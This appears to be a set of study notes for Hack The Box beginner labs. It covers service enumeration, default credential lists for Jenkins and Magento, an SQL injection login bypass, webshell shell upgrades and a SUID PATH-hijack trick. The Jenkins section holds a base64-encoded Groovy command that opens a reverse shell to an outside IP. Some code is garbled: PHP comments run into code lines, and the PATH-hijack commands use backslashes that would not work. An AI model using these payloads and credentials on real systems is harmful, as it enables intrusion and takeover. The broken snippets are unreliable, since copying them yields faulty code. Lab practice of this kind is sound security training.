# HTB - Starting points

## Tier 0 - beginner tips

### Check what is behind port

```https://www.speedguide.net/port.php?port=135```

### FTP (21/20) 

Anonymous access (FTP code 230) - `anonymous:anonymous`

```bash
$ ftp <ip>
// Get - download file
```

### SMB (445)

```bash 
$ smbclient -L \\\\<ip>\\ -U Admin
$ smbclient \\\\<ip>\\<dir>
// Get - download file
```

$ at the end means that is an administrative share.

### RDP (3389)

```bash
$ xfreerdp /u:JohnDoe /p:Pwd123! /w:1366 /h:768 /v:<ip>:<port>
```

### Web enumeration - Dir busting

```bash
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<IP>
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<IP> -x html,php
```

## Tier 1

### Common HTB passwords

```
admin:admin
guest:guest
user:user
root:root
administrator:password
```

### SQLi injection

Login page

```php
<?php
mysql_connect("localhost", "db_username", "db_password"); 
# Connection to the SQLDatabase.
mysql_select_db("users"); 
# Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.
$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in 
$result.if ($count==1){
    # Checks if there's at least 1 result, and if yes:
    $_SESSION['username'] =$username; 
    # Creates a session with the specified 
    $username.$_SESSION['password'] =$password; 
    # Creates a session with the specified 
    $password.header("location:home.php"); 
    # Redirect to homepage.
}
else { 
    # If there's no singular result of a user/pass combination:
    header("location:login.php");
    # No redirection, as the login failed in the case the $count variable is not equal to1, HTTP Response code 200 OK.
    }
    ?>
```

Common SQL query to logIn
```sql
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Modified SQL query to bypass logging and obtain password
`admin'#` 
```sql
$sql="SELECT * FROM users WHERE username='$username'#' AND password='$password'";
```
### MySQL

Port - 3306 

MySQL cheatsheet - https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```bash
mysql -h <IP> -u root
```
### Check technologies on websites - plugin

https://www.wappalyzer.com/apps

### Adding DNS resolve 

```
/etc/hosts
```

### Magento default credentials

Passwords - 
>An Admin password must be seven or more characters long and include both letters andnumbers.

Bruteforce? - No
>By default, aftersix attempts the account is locked, and the user must wait a few minutes before tryingagain. Locked accounts can also be reset from the Admin.

```
admin admin123
admin root123
admin password1
admin administrator1
admin changeme1
admin password123
admin qwerty123
admin administrator123
admin changeme123
```

### Jenkins default credentials

```
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1
```

### How to pwn Jenkins

https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution 
https://github.com/gquere/pwn_jenkins 

Script console allow to type in an arbitrary Groovy script and execute it on the server. 

Script console access - http://jenkins_ip/script

Easy code execution via script console - apply specific command in base64:
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,c2ggLWkgPiYgL2Rldi91ZHAvMTAuMTAuMTUuMTA4LzkwMDEgMD4mMQ==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
## Tier 2

### Web exploitation

Webshells - https://github.com/BlackArch/webshells 

Running terminal session via webshell

```
python3 -c'import pty;pty.spawn("/bin/bash")'
```

### Basic checking user privileges

```
find / -group bugtracker 2>/dev/null
sudo -l
id
```

### Checking file info

```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

### SUID exploitation

Run program, check the path of the command, try to switch usage of command to shell by adding modified executable with PATH to use by scripts:

```
cd \tmp\
echo "\bin\sh" > cat
chmod +x cat
export PATH=/tmp:$PATH
echo $PATH

//run executable from tmp 
```